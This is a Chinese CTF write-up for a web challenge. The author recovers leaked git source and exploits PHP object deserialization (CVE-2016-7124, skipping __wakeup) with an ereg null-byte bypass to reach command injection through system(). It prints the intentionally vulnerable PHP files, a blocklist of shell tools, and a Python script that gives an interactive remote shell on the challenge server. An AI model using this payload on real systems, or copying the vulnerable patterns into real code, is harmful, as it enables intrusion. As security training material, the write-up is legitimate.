---
title: 赛博地球杯工业互联网安全大赛web题--工控系统的敏感消息遭泄漏
date: 2018-01-18 20:51:00
tags: [WEB]
categories: CTF
copyright: true
---
## 前言
web题大致看了一下，都没啥思路。。。。。麻蛋签到题也不会，但是这道题我是有思路的，套路跟以前做过的ctf题目类似，算是中规中矩的题目了。
## 分析
题目内容：
>云平台消息中心，泄漏了不该泄漏的消息。导致系统可以被入侵。

既然是信息泄露，首先想到的是源码泄露。试了一下，发现是git目录泄露，那么利用工具直接把git目录下载下来（工具网上有但我是自己写的，有时间写一篇博客记录下）。
然后恢复所有删除的文件即可，使用如下命令：
```PowerShell
git ls-files -d | xargs git checkout --
```
之后只用关注`class.php，index2.php，waf.php`这三个文件即可。
```php
//file: class.php
<?php
error_reporting(0);

class Record{
    public $file="Welcome";

    public function __construct($file)
    {
        $this->file = $file;
    }


    public function __wakeup()
    {
        $this->file = 'wakeup.txt';
    }

    public function __destruct()
    {
        if ($this->file != 'wakeup.txt' && $this->file != 'sleep.txt' && $this->file != 'Welcome') {
        	system("php ./import/$this->file.php");
        }else{
        	echo "<?php Something destroyed ?>";
        }
    }


}

$b =new Record('Welcome');
unset($b);

?>

```
```php
//file: index2.php
<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
  	<meta name="renderer" content="webkit">
  	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  	<link rel="stylesheet" href="layui/css/layui.css"  media="all">
	<title>消息中心</title>
	<meta charset="utf-8">
</head>
<body>
<ul class="layui-nav">
        <li class="layui-nav-item layui-this"><a href="?page=index">云平台消息中心</a></li>
    </ul>
<fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;">
  <legend>系统消息</legend>
</fieldset>
<ul class="layui-timeline">
  <li class="layui-timeline-item">
    <i class="layui-icon layui-timeline-axis"></i>
    <div class="layui-timeline-content layui-text">
      <h3 class="layui-timeline-title">2018年1月</h3>
      <p></p>
      <ul>
        <li><a href="?file=Welcome">云平台会员独享，云防护加固，每月仅需xxx</a></li>
        <li><a href="?file=Me"  >云平台会员抽奖开始啦</a></li>
      </ul>
    </div>
  </li>
  <li class="layui-timeline-item">
    <i class="layui-icon layui-timeline-axis"></i>
    <div class="layui-timeline-content layui-text">
      <h3 class="layui-timeline-title">2017年12月</h3>
      <p></p>
      <ul>
        <li><a href="?file=Record" >5分钟快速了解本系统</a></li>
        <li><a href="?file=Flag&secret=yes"   >欢迎使用xx云工控管理系统</a></li>
      </ul>
    </div>
  </li>
</ul>

<?php
error_reporting(0);

include 'class.php';
include 'waf.php';
if(@$_GET['file']){
	$file = $_GET['file'];
	waf($file);
}else{
	$file = "Welcome";
}

if($_GET['id'] === '1'){
	include 'welcome/nothing.php';
	die();
}
$secret = $_GET['secret'];
$ad  = $_GET['ad'];

if(isset($ad)){
    if(ereg("^[a-zA-Z0-9]+$", $ad) === FALSE)
    {
        echo '<script>alert("Sorry ! Again !")</script>';
    }
    elseif(strpos($ad, '--') !== FALSE)
    {
				echo "Ok Evrything will be fine!<br ><br >";
				if (stripos($secret, './') > 0) {
					die();
				}
        unserialize($secret);
    }
    else
    {
        echo '<script>alert("Sorry ! You must have --")</script>';
    }
 }


?>

<?php

if($file == "Welcome"){
	require_once 'welcome/welcome.php';
}else{
	if(!file_exists("./import/$file.php")){
		die("The file does not exit !");
	}elseif(!system("php ./import/$file.php")){
		die('Something was wrong ! But it is ok! ignore it :)');

	}
}
?>
</div>
<script>
    layui.use('element', function() {
        var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块
        //监听导航点击
        element.on('nav(demo)', function(elem) {
            //console.log(elem)
            layer.msg(elem.text());
        });
    });
    </script>
</body>
</html>

```
```php
//file: waf.php
<?php
error_reporting(0);

function waf($values){
	//$black = [];
	$black = array('vi','awk','-','sed','comm','diff','grep','cp','mv','nl','less','od','cat','head','tail','more','tac','rm','ls','tailf',' ','%','%0a','%0d','%00','ls','echo','ps','>','<','${IFS}','ifconfig','mkdir','cp','chmod','wget','curl','http','www','`','printf');

	foreach ($black as $key => $value) {
		if(stripos($values,$value)){
			die("Attack!");
		}
		if (!ctype_alnum($values)) {
			die("Attack!");
		}
	}
}

?>

```
三个文件的逻辑很简单，其中index2.php中有主逻辑，下面一个个分析。
- waf.php
这个文件只有一个函数`waf()`，这个函数对传入字符串进行黑名单排查。
- class.php
该文件中建立了一个`Record`的类，该类有一个属性file，有`__sleep()`,`__wakeup`两个特殊的魔术方法定义，感觉这就是解题关键。
- index2.php
该文件有题目的主逻辑，只要突破对`$ad`变量的重重阻碍，就可到达一个解序列化函数`unserialize($secret)`，而这就是解题关键。

## 解决
通读三个文件，有两处调用了system函数，其中index2.php中在调用前会检查文件是否存在，只有`Record`类的`__destruct`函数中调用时并未做检查。这里如果控制file属性，就可以控制system函数的参数，从而造成命令注入。
这里需要解决三大问题：
- ereg和strpos函数矛盾
这里可以利用ereg函数的截断漏洞绕过，该函数会在ascii码为0的地方截断。
- secret中不能包含`./`
这个不是问题，但是要注意，嘿嘿。
- 解序列化后如何进入system的条件语句块
这里要利用php的一个漏洞（CVE-2016-7124），php（PHP5< 5.6.25；PHP7< 7.0.10）在使用函数`unserialize`时，若属性个数大于实际属性个数就不会调用类的`__wakeup`函数。在这里就能控制file属性的值了。
于是为了更容易的执行命令，我用python写了如下的代码
```python
import requests
def work():
    secret = 'O:6:"Record":3:{s:4:"file";s:%d:"%s";}'
    ad = '1\x00--'
    file ='Flag'
    url = "http://47.104.99.231:20003/index2.php"
    
    while(True):
        cmd = raw_input('$ ')
        if(cmd == 'quit'):
            print 'over!!!'
            break
        cmd = 'Flag.php && ({}) && echo '.format(cmd)
        s = secret%(len(cmd),cmd)
        r = requests.get(url,params={'file':file,'ad':ad,'secret':s})
        r.encoding = 'utf-8'
        i = r.text.find('Flag is !')+9
        j = r.text.rfind('Flag is !')-6
        print r.text[i:j].encode('GB18030')
        r.close()
work()
```
最后flag在Flag.php文件中：
```PowerShell
$ ls import
Flag.php
Me.php
Record.php

$ cat import/Flag.php
<?php
error_reporting(0);
//$flag = "flag{g_i_i_t_is_unsafe_ahhhahahah}";

echo "Flag is !";
?>

$
```
## 总结
这道题考察了多处php的一些漏洞，但在ctf中属于常规题目，没有过多的脑洞还是挺适合我的，嘿嘿。。但我还是很菜，因为这道题做出来的人很多！！以后要继续向大佬学习。